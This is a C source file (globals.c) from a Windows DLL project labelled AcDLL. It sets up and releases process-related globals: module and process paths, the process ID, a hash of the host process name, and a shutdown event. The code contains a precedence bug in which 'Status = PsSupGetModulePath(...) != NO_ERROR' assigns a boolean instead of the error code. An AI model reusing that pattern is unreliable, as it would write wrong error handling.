//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// AcDLL project. Version 1.9.17.3
//	
// module: globals.c
// $Revision: 192 $
// $Date: 2014-07-11 16:53:02 +0400 (Пт, 11 июл 2014) $
// description: 
//	 Global constants and variables

#include "common.h"
#include "..\rt\str.h"

DWORD		g_CurrentProcessId		=	0;
DWORD		g_SystemVersion			=	0;
DWORD		g_CurrentProcessFlags	=	0;
HMODULE		g_CurrentProcessModule	=	0;
HMODULE		g_CurrentModule			=	0;
LPTSTR		g_CurrentProcessPath	=	0;
LPTSTR		g_CurrentModulePath		=	0;
HANDLE		g_AppShutdownEvent		=	0;
LPTSTR		g_CurrentProcessName	=	0;
ULONG		g_HostProcess			=	0;


VOID ReleaseGlobals(VOID)
{
	g_CurrentProcessName = NULL;

	if (g_CurrentProcessPath){
		AppFree(g_CurrentProcessPath);
		g_CurrentProcessPath = NULL;
	}

	if (g_CurrentModulePath){
		AppFree(g_CurrentModulePath);
		g_CurrentModulePath = NULL;
	}

	if (g_AppShutdownEvent)
		CloseHandle(g_AppShutdownEvent);
}

WINERROR InitGlobals(HMODULE CurrentModule, ULONG Flags)
{
	WINERROR Status = NO_ERROR;

	g_CurrentModule = CurrentModule;
	g_CurrentProcessModule = GetModuleHandle(0);

	if (Flags & G_SYSTEM_VERSION)
		g_SystemVersion		= GetVersion();

	if (Flags & G_CURRENT_PROCESS_ID)
		g_CurrentProcessId	= GetCurrentProcessId();

#ifndef _WIN64
	if (PsSupIsWow64Process(g_CurrentProcessId, 0))
		g_CurrentProcessFlags |= GF_WOW64_PROCESS;
#endif

	do 
	{
		if (Flags & G_CURRENT_MODULE_PATH)
		{
			if ((Status = PsSupGetModulePath(g_CurrentModule, &g_CurrentModulePath) != NO_ERROR))
			{
				DbgPrint("Globals: PsSupGetModulePath failed with status %u.\n", Status);
				break;
			}
			
		}

		if (Flags & G_CURRENT_PROCESS_PATH)
		{
			if ((Status = PsSupGetModulePath(0, &g_CurrentProcessPath) != NO_ERROR))
			{
				DbgPrint("Globals: PsSupGetModulePath failed with status %u.\n", Status);
				break;
			}
			g_CurrentProcessName = strrchr(g_CurrentProcessPath, '\\') + 1;
			g_HostProcess = StrHashA(g_CurrentProcessName);
		}

		if (Flags & G_APP_SHUTDOWN_EVENT)
		{
			if ((g_AppShutdownEvent = CreateEvent(NULL, TRUE, FALSE, 0)) == 0)
			{
				Status = GetLastError();
				DbgPrint("Globals: Initializing AppShutdownEvent failed with status %u.\n", Status);
				break;
			}
		}

	} while(FALSE);

	if (Status != NO_ERROR)
		ReleaseGlobals();

	return(Status);
}


